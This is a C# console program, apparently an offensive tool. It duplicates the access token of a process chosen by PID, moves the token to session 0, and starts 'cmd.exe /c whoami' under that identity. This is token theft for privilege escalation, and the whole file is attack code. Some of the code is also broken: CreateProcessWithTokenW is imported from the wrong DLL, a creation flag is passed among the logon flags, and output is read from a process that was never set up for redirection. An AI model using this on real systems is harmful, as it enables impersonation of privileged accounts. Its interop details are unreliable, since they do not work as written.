using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DuplicateToken
{
    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, int dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);

        [DllImport("userenv.dll", SetLastError = true)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private const int TOKEN_QUERY = 0x0008;
        private const int TOKEN_DUPLICATE = 0x0002;
        private const int TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const int SecurityImpersonation = 2;
        private const int TokenPrimary = 1;
        private const int LOGON_WITH_PROFILE = 0x00000001;
        private const int CREATE_UNICODE_ENVIRONMENT = 0x00000400;

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: DuplicateToken.exe <PID>");
                return;
            }
            int targetPID = int.Parse(args[0]);
            IntPtr targetProcessHandle = IntPtr.Zero;
            IntPtr targetTokenHandle = IntPtr.Zero;
            IntPtr duplicatedTokenHandle = IntPtr.Zero;

            try
            {
                targetProcessHandle = Process.GetProcessById(targetPID).Handle;

                if (!OpenProcessToken(targetProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, out targetTokenHandle))
                {
                    Console.WriteLine("OpenProcessToken failed with error code: " + Marshal.GetLastWin32Error());
                    return;
                }

                if (!DuplicateTokenEx(targetTokenHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, IntPtr.Zero, SecurityImpersonation, TokenPrimary, ref duplicatedTokenHandle))
                {
                    Console.WriteLine("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
                    return;
                }

                uint tokenSessionId = 0;
                if (!SetTokenInformation(duplicatedTokenHandle, 9 /*TokenSessionId*/, ref tokenSessionId, sizeof(uint)))
                {
                    Console.WriteLine("SetTokenInformation failed with error code: " + Marshal.GetLastWin32Error());
                    return;
                }

                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "winsta0\\default";

                PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
                if (!CreateProcessWithTokenW(duplicatedTokenHandle, LOGON_WITH_PROFILE | CREATE_UNICODE_ENVIRONMENT, null, "cmd.exe /c whoami", 0, IntPtr.Zero, null, ref startupInfo, out processInformation))
                {
                    Console.WriteLine("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
                    return;
                }

                Console.WriteLine("Process created successfully. Whoami output:");
                Process whoami = Process.GetProcessById(processInformation.dwProcessId);
                whoami.WaitForExit();
                Console.WriteLine(whoami.StandardOutput.ReadToEnd());
            }
            finally
            {
                if (targetTokenHandle != IntPtr.Zero)
                    CloseHandle(targetTokenHandle);
                if (duplicatedTokenHandle != IntPtr.Zero)
                    CloseHandle(duplicatedTokenHandle);
            }
        }
    }
}

